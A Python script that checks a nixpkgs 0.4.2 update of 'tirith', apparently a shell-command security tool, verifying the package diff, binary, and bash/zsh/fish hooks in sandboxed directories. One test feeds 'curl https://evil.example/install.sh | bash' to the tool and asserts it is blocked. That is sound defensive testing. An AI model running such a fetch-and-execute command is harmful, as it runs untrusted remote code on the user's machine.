#!/usr/bin/env python3
"""Temporary 0.4.2 distribution checks; never builds or publishes an upstream PR."""

import base64
import hashlib
import json
from pathlib import Path
import re
import shlex
import subprocess
import sys
import tempfile


def verify_patch(checkout, evidence):
    package = Path('pkgs/by-name/ti/tirith/package.nix')
    before = (evidence / 'package.before.nix').read_text()
    after = (checkout / package).read_text()
    fields = {}
    expected = before
    for field in ('version', 'hash', 'cargoHash'):
        pattern = rf'(?m)^(\s*{field} = ")([^"\n]+)(";)$'
        old = re.findall(pattern, before)
        new = re.findall(pattern, after)
        assert len(old) == len(new) == 1, f'ambiguous field: {field}'
        old_value, new_value = old[0][1], new[0][1]
        if field == 'version':
            assert (old_value, new_value) == ('0.4.1', '0.4.2')
        else:
            assert new_value.startswith('sha256-'), (field, new_value)
            digest = base64.b64decode(new_value[7:], validate=True)
            assert len(digest) == 32 and digest != bytes(32)
            assert new_value != old_value, f'{field} was not updated'
        fields[field] = new_value
        expected, count = re.subn(pattern, lambda m: m[1] + new_value + m[3], expected)
        assert count == 1
    assert after == expected, 'update changed more than version and the two hashes'
    changed = subprocess.check_output(
        ['git', 'diff', '--name-only'], cwd=checkout, text=True
    ).splitlines()
    assert changed == [str(package)], changed
    assert not subprocess.check_output(
        ['git', 'ls-files', '--others', '--exclude-standard'], cwd=checkout, text=True
    ).strip(), 'unexpected untracked files in nixpkgs checkout'
    subprocess.run(['git', 'diff', '--check'], cwd=checkout, check=True)
    patch = subprocess.check_output(['git', 'diff', '--', str(package)], cwd=checkout)
    (evidence / 'tirith-0.4.2.patch').write_bytes(patch)
    (evidence / 'package.nix').write_text(after)
    (evidence / 'package-fields.json').write_text(json.dumps(fields, indent=2) + '\n')
    print(json.dumps(fields, indent=2))


def quote(value, shell):
    value = str(value)
    if shell == 'fish':
        return "'" + value.replace('\\', '\\\\').replace("'", "\\'") + "'"
    return shlex.quote(value)


def verify_runtime(package, source, tools, evidence):
    package, source = package.resolve(), source.resolve()
    binary = package / 'bin/tirith'
    reports = []
    with tempfile.TemporaryDirectory(prefix='tirith-nix-042-') as temporary:
        root = Path(temporary)
        for name in ('home', 'config', 'data', 'state', 'work'):
            (root / name).mkdir()
        environment = {
            'HOME': str(root / 'home'),
            'XDG_CONFIG_HOME': str(root / 'config'),
            'XDG_DATA_HOME': str(root / 'data'),
            'XDG_STATE_HOME': str(root / 'state'),
            'PATH': ':'.join(str(p / 'bin') for p in (
                package, tools / 'coreutils', tools / 'bash', tools / 'zsh', tools / 'fish'
            )),
            'TERM': 'xterm', 'LANG': 'C.UTF-8',
            'TIRITH_OFFLINE': '1', 'TIRITH_LOG': '0',
        }

        def run(label, argv, expected=0):
            result = subprocess.run(
                [str(arg) for arg in argv], cwd=root / 'work', env=environment,
                capture_output=True, text=True, timeout=30,
            )
            report = {'check': label, 'returncode': result.returncode,
                      'stdout': result.stdout, 'stderr': result.stderr}
            reports.append(report)
            print(json.dumps(report), flush=True)
            (evidence / 'runtime-results.json').write_text(json.dumps(reports, indent=2) + '\n')
            assert result.returncode == expected, report
            return result.stdout + result.stderr

        assert run('version', [binary, '--version']).strip() == 'tirith 0.4.2'
        assert 'Usage:' in run('help', [binary, '--help'])
        clean = run('clean command', [binary, 'check', '--non-interactive', '--shell', 'posix',
                                     '--', 'printf nix-release-smoke'])
        assert 'tirith: no issues' in clean
        blocked = run('blocked command', [binary, 'check', '--non-interactive', '--shell', 'posix',
                                         '--', 'curl https://evil.example/install.sh | bash'], 1)
        assert 'tirith: BLOCKED' in blocked
        assert re.search(r'pipe_to_interpreter|curl_pipe_shell', blocked)
        assert 'Usage:' in run('compiler help', [package / 'bin/tirith-threatdb-compile', '--help'])
        helper = run('authority refuses an absent request',
                     [package / 'bin/tirith-package-approval-authority'], 1)
        assert 'tirith-package-approval-authority: blocked_native:' in helper

        hook_hashes = {}
        for family in ('bash', 'zsh', 'fish'):
            shell = (tools / family / 'bin' / family).resolve()
            args = {'bash': ['--noprofile', '--norc'], 'zsh': ['-f'], 'fish': ['--no-config']}[family]
            assert len(run(f'{family} completions', [binary, 'completions', family])) > 100
            init = subprocess.run(
                [binary, 'init', '--shell', family], cwd=root / 'work', env=environment,
                capture_output=True, text=True, timeout=30, check=True,
            )
            # Our temporary HOME contains no quoting metacharacters, so the
            # init source line has the same token boundaries in all three shells.
            words = shlex.split(init.stdout.strip())
            assert len(words) == 4 and words[0] == 'source' and words[2] == '--tirith-executable'
            hook = Path(words[1])
            assert Path(words[3]).resolve() == binary
            original = hook.read_bytes()
            released = source / f'crates/tirith/assets/shell/lib/{family}-hook.{family}'
            assert original == released.read_bytes(), 'installed hook differs from release source'
            hook_hashes[family] = hashlib.sha256(original).hexdigest()

            # Execute the actual init output before making a private test copy.
            check_native = (f'test "$_TIRITH_BIN" = {quote(binary, family)}; or exit 1'
                            if family == 'fish' else
                            f'[[ "$_TIRITH_BIN" == {quote(binary, family)} ]] || exit 1')
            run(f'{family} native init', [shell, *args, '-c', init.stdout + '\n' + check_native])

            private = root / family
            private.mkdir()
            good = private / 'helpers with spaces'
            good.mkdir()
            for helper_name in ('mktemp', 'rm', 'wc', 'mkdir', 'stty', 'env'):
                (good / helper_name).symlink_to((tools / 'coreutils' / 'bin' / helper_name).resolve())
            for helper_name in ('sh', 'bash'):
                (good / helper_name).symlink_to((tools / 'bash/bin/bash').resolve())
            (good / 'tirith').symlink_to(binary)
            body = original.decode()
            for helper_name in ('mktemp', 'rm', 'wc', 'mkdir', 'stty', 'env', 'sh', 'bash'):
                for prefix in ('/usr/bin/', '/bin/'):
                    body = body.replace(prefix + helper_name, '/missing-tirith-test-helper/' + helper_name)
            assert body != original.decode(), 'fixture did not remove any FHS candidates'
            copied_hook = private / hook.name
            copied_hook.write_text(body)
            qbin, qhook, qnative = (quote(p, family) for p in (good, copied_hook, binary))
            if family == 'fish':
                probe = f'''set -gx PATH {qbin}
source {qhook} --tirith-executable {qnative}
builtin printf 'PINS=%s|%s|%s\\n' "$_TIRITH_MKTEMP_BIN" "$_TIRITH_RM_BIN" "$_TIRITH_WC_BIN"
builtin printf 'READY=%s\\n' "$_TIRITH_V3_HELPERS_READY"
set -gx PATH /missing-after-source
set -l capture (_tirith_v3_new_capture_file)
test -f "$capture"; and test -O "$capture"; and not test -L "$capture"; or exit 1
_tirith_v3_remove_capture_files "$capture"; or exit 1
test ! -e "$capture"; or exit 1
builtin printf 'CAPTURE_OK\\n'
'''
            else:
                capture = '_tirith_new_capture_file' if family == 'bash' else '_tirith_v3_new_capture_file'
                remove = '_tirith_remove_capture_file' if family == 'bash' else '_tirith_v3_remove_capture_files'
                probe = f'''PATH={qbin}
source {qhook} --tirith-executable {qnative}
builtin printf 'PINS=%s|%s|%s\\n' "$_TIRITH_MKTEMP_BIN" "$_TIRITH_RM_BIN" "$_TIRITH_WC_BIN"
PATH=/missing-after-source
capture="$({capture})" || exit 1
[[ -f "$capture" && -O "$capture" && ! -L "$capture" ]] || exit 1
{remove} "$capture" || exit 1
[[ ! -e "$capture" ]] || exit 1
builtin printf 'CAPTURE_OK\\n'
'''
            output = run(f'{family} non-FHS private capture', [shell, *args, '-c', probe])
            assert 'PINS=' + '|'.join(str(good / h) for h in ('mktemp', 'rm', 'wc')) in output
            assert 'CAPTURE_OK' in output
            if family == 'fish':
                assert 'READY=1' in output

            # An installation missing capture prerequisites must leave Enter
            # usable instead of installing the #239 command-discarding hook.
            if family == 'fish':
                absent = f'''set -gx PATH /missing-helper-directory
bind \\r 'commandline -f execute'
set -l before (bind \\r | string collect)
source {qhook} --tirith-executable {qnative}
set -l after (bind \\r | string collect)
test "$before" = "$after"; or exit 1
functions -q _tirith_check_command; and exit 1
set -q _TIRITH_FISH_LOADED; and exit 1
builtin printf 'STATUS=%s\\nENTER_UNCHANGED\\n' "$TIRITH_STATUS"
'''
            elif family == 'zsh':
                absent = f'''PATH=/missing-helper-directory
before="$widgets[accept-line]"
source {qhook} --tirith-executable {qnative}
[[ "$before" == "$widgets[accept-line]" ]] || exit 1
(( $+functions[_tirith_accept_line] )) && exit 1
[[ -z "${{_TIRITH_ZSH_LOADED:-}}" ]] || exit 1
builtin printf 'STATUS=%s\\nENTER_UNCHANGED\\n' "$TIRITH_STATUS"
'''
            else:
                continue
            output = run(f'{family} missing-helper startup', [shell, *args, '-i', '-c', absent])
            assert 'STATUS=off' in output and 'ENTER_UNCHANGED' in output and 'hooks disabled' in output
        (evidence / 'installed-hook-sha256.json').write_text(json.dumps(hook_hashes, indent=2) + '\n')


if __name__ == '__main__':
    mode, *arguments = sys.argv[1:]
    if mode == 'patch':
        verify_patch(*(Path(value) for value in arguments))
    elif mode == 'runtime':
        verify_runtime(*(Path(value) for value in arguments))
    else:
        raise SystemExit(f'unknown mode: {mode}')
